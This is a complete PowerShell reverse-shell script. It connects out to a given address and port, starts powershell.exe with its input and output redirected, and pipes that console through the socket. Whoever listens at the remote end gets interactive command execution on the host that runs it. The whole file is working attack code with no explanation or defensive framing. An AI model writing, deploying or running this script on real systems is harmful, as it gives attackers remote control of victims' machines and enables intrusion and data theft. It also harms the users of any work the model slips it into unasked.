param (
    [Parameter(Position = 0, Mandatory = $true)]
    [String]$address,

    [Parameter(Position = 1, Mandatory = $false)]
    [String]$port = 1337,

    [Parameter(Position = 2, Mandatory = $false)]
    [String]$filename = 'powershell.exe',

    [Parameter(Position = 3, Mandatory = $false)]
    [String]$arguments = ''
)


try
{
    $socket = New-Object System.Net.Sockets.TcpClient($address, $port)
    $socket_stream = $socket.GetStream()
}
catch
{
    if ($socket)
    {
        $socket.Dispose()
    }

    Write-Error "Failed to establish communication: $_"
    exit 1
}


$socket_mutex_name = [Guid]::NewGuid().ToString()

$process_start_info = New-Object System.Diagnostics.ProcessStartInfo($filename, $arguments)
$process_start_info.UseShellExecute = $false
$process_start_info.CreateNoWindow = $false
$process_start_info.RedirectStandardInput = $true
$process_start_info.RedirectStandardOutput = $true
$process_start_info.RedirectStandardError = $true

$process = New-Object System.Diagnostics.Process
$process.StartInfo = $process_start_info


try
{
    [void]$process.Start()
}
catch
{
    $socket.Dispose()

    Write-Error "Failed to start process: $_"
    exit 1
}


$input_redirector = {
    param (
        [System.IO.Stream]$from, # from socket stream
        [System.IO.Stream]$to # to stdin
    )

    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read_count = $from.Read($buffer, 0, $buffer.Length)

            if ($bytes_read_count -eq 0)
            {
                break # stream has been closed, connection was probably terminated
            }

            $to.Write($buffer, 0, $bytes_read_count)
            $to.Flush()
            [Array]::Clear($buffer, 0, $bytes_read_count)
        } 
        catch
        {
            Write-Error "Something went wrong during socket output -> process input piping: $_"
            break
        }
    }
}

$output_redirector = {
    param (
        [System.IO.Stream]$from, # from stdout or stderr
        [System.IO.Stream]$to, # to socket stream
        [String]$mutex_name
    )

    $locked = $false # this is needed because apparently .NET lets you stack mutex locks and releases
    $lock = New-Object System.Threading.Mutex($false, $mutex_name) # get named mutex
    $buffer = New-Object Byte[] 1024

    while ($true)
    {
        try
        {
            $bytes_read_count = $from.Read($buffer, 0, $buffer.Length)

            if ($bytes_read_count -eq 0)
            {
                if ($locked)
                {
                    $lock.ReleaseMutex()
                    $locked = $false
                }

                break # stream has been closed, process probably exited
            }

            if (-not $locked)
            {
                [void]$lock.WaitOne()
                $locked = $true
            }

            $to.Write($buffer, 0, $bytes_read_count)
            [Array]::Clear($buffer, 0, $bytes_read_count)

            if (-not $from.DataAvailable)
            {
                $to.Flush()
                
                if ($locked)
                {
                    $lock.ReleaseMutex()
                    $locked = $false
                }
            }
        }
        catch
        {
            Write-Error "Something wen't wrong during process output -> socket input piping: $_"
            break
        }
    }
}


$jobs = @(
    # handler for socket -> stdin
    (Start-ThreadJob -ScriptBlock $input_redirector -ArgumentList $socket_stream, $process.StandardInput.BaseStream),
    # handler for stdout -> socket
    (Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardOutput.BaseStream, $socket_stream, $socket_mutex_name),
    # handler for stderr -> socket
    (Start-ThreadJob -ScriptBlock $output_redirector -ArgumentList $process.StandardError.BaseStream, $socket_stream, $socket_mutex_name)
)


while ($true)
{
    $job_states = $jobs | ForEach-Object { Get-Job -Id $_.Id }
    $jobs_failed = $job_states | Where-Object { $_.State -eq 'Failed' }
    $jobs_completed = $job_states | Where-Object { $_.State -eq 'Completed' }

    if ($jobs_failed)
    {
        $jobs_failed | ForEach-Object { Receive-Job -Job $_.Id }
        break
    }

    if ($jobs_completed)
    {
        break
    }

    Start-Sleep -Milliseconds 250
}


$jobs | ForEach-Object {
    Stop-Job -Job $_
    Remove-Job -Job $_ -Force
}

$process.Dispose()
$socket.Dispose()